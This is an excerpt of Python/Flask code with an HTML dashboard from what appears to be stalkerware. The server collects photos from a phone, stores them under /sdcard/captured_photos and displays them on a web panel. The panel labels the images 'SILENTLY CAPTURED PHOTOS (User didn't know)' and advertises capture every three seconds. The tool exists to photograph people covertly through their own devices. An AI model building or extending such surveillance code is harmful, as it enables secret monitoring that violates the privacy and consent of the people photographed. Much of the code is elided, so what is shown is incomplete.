...
# FIX: Photos saved directly to phone's storage (/sdcard/captured_photos/)
...
# ========== FIX: PHOTOS DIRECTLY TO PHONE STORAGE ==========
# Android internal storage path
ANDROID_STORAGE = '/sdcard/captured_photos'  # Direct phone storage
# Alternative paths in case /sdcard doesn't work
ALT_STORAGE_PATHS = [
    '/storage/emulated/0/captured_photos',
    '/mnt/sdcard/captured_photos',
    '/sdcard/captured_photos'
]

# Try to find the correct storage path
PHOTO_FOLDER = None
for path in ALT_STORAGE_PATHS:
    try:
        ...
        os.remove(test_file)
        PHOTO_FOLDER = path
        print(f"✅ Using storage path: {PHOTO_FOLDER}")
        break
    except Exception as e:
        print(f"⚠️ Cannot use {path}: {e}")

# If no path works, fallback to local directory
if PHOTO_FOLDER is None:
    PHOTO_FOLDER = 'captured_photos'
    os.makedirs(PHOTO_FOLDER, exist_ok=True)
    print(f"⚠️ Using fallback path: {PHOTO_FOLDER}")
# ===========================================================
    ...
    try:
        ...
        if data_type == 'Text':
            ...
            try:
                ...
                rel_path = os.path.basename(photo_filename)
                latest_data['photos'].append({'file': rel_path, 'full_path': photo_filename, 'time': datetime.now().isoformat()})
                logger.info(f"📸 PHOTO SAVED: {photo_filename}")
                print(f"📸 PHOTO CAPTURED: {os.path.basename(photo_filename)} -> {PHOTO_FOLDER} | Total: {len(latest_data['photos'])}")
            except Exception as e:
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            ...
            .storage-path { background: #2a2a2a; padding: 8px; border-radius: 5px; margin-top: 10px; font-size: 11px; color: #ffa500; }
        </style>
    </head>
    <body>
        <div class="header">
            ...
            <div class="storage-path" id="storagePath">📂 Checking storage path...</div>
        </div>
            ...
            function loadData() {
                fetch('/api/latest-data').then(res => res.json()).then(data => {
                    ...
                    if (data.photos && data.photos.length > 0) {
                        document.getElementById('photoCount').innerHTML = `📸 Photos captured silently: ${data.photos.length}<br><span style="font-size:11px;">💾 Saved to: /sdcard/captured_photos/</span>`;
                        html += '<h2>📸 SILENTLY CAPTURED PHOTOS (User didn\'t know)</h2><div class="photo-grid">';
                        data.photos.slice().reverse().forEach(photo => {
                            html += '<div class="photo-item"><img src="/photos/' + photo.file + '?t=' + Date.now() + '"><div class="timestamp">' + new Date(photo.time).toLocaleString() + '</div><div class="timestamp" style="font-size:8px;">' + photo.full_path + '</div></div>';
                        });
                        html += '</div>';
                    }
                ...
                fetch('/api/storage-path').then(res => res.json()).then(data => {
                    document.getElementById('storagePath').innerHTML = `📂 PHOTO STORAGE: ${data.path} (${data.writable ? '✅ WRITABLE' : '❌ READ ONLY'})`;
                });
            }
            loadData();
...
@app.route('/api/storage-path')
def get_storage_path():
    return jsonify({
        'path': PHOTO_FOLDER,
        'writable': os.access(PHOTO_FOLDER, os.W_OK)
    })
...
"""
    ...
    print(f"📸 PHOTOS SAVED TO: {PHOTO_FOLDER} (DIRECT PHONE STORAGE)")
    print("\n" + "─"*70)
    ...
    print(f"   ✓ UNLIMITED PHOTOS (every 3 seconds) → {PHOTO_FOLDER}")
